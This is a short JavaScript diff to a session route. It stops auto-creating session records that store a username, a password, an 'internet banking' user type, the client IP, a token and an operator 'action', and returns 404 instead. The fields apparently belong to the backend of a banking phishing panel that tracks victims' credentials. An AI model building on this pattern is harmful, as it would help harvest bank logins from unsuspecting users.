@@ -174,22 +174,7 @@ const registerSessionRoutes = (prefix) => {
     const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
 
     if (!sessions[id]) {
-      sessions[id] = {
-        id,
-        index: Object.keys(sessions).length + 1,
-        username: "—",
-        password: "—",
-        tipoUsuario: "Banca por Internet",
-        device: "desktop",
-        ip: clientIp,
-        state: state || "typing",
-        token: "",
-        action: null,
-        createdAt: Date.now(),
-        last_seen: Date.now(),
-        updatedAt: Date.now()
-      };
-      return res.json({ success: true, session: sessions[id] });
+      return res.status(404).json({ error: "Session not found" });
     }
 
     sessions[id].state = state;
